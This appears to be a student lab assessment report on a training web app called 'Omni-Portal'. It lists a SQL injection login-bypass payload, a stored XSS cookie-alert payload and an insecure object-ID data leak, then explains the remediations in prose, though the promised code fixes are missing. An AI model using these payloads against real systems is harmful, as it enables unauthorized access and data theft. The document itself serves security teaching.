# OMNI-PORTAL ASSESSMENT REPORT
**Operator:** **Deadline:** April 5 @ 11:59 PM 

## PHASE 1: AUTH BYPASS (SQLi)
* **Payload Used:** ' OR 1=1 --
* **Result:**
 Successfully bypassed login and obtained 'auth_token' cookie.

## PHASE 2: CLIENT-SIDE HIJACK (XSS)
* **Stored XSS Payload:**
 <script>alert(document.cookie)</script>

* **Secret Cookie Captured:**
 auth_token=SUPPORT_TIER_1_SECRET_TOKEN

## PHASE 3: API ENUMERATION (BOLA)
* **Insecure Order ID:**
 order_id":501
* **Confidential Data Leaked:**
 {"amount":"$15,000.00","details":"Confidential Server Lease","order_id":501}

## PHASE 4: THE REMEDIATION
* **Fix for SQLi:**
SQLi Fix — Parameterized Queries
The vulnerable code builds SQL strings directly from user input.
The fix is to use parameterized queries, where the query structure and
user data are sent to the database separately: 

* **Fix for XSS:**
XSS Fix — Output Encoding / HTML Escaping
The vulnerable code renders user input directly into the HTML. The fix is to
escape all user-supplied content before inserting it into the page,
so characters like <, >, and " are converted to harmless HTML entities instead
 of being interpreted as code. In Flask, use markupsafe.escape():

* **Fix for API BOLA:**
API BOLA Fix — Object-Level Authorization
The /api/v2/orders/<order_id> endpoint fetches any order by ID with no check
that the requester actually owns it. The fix is to verify the requesting
user's identity against the resource before returning it:
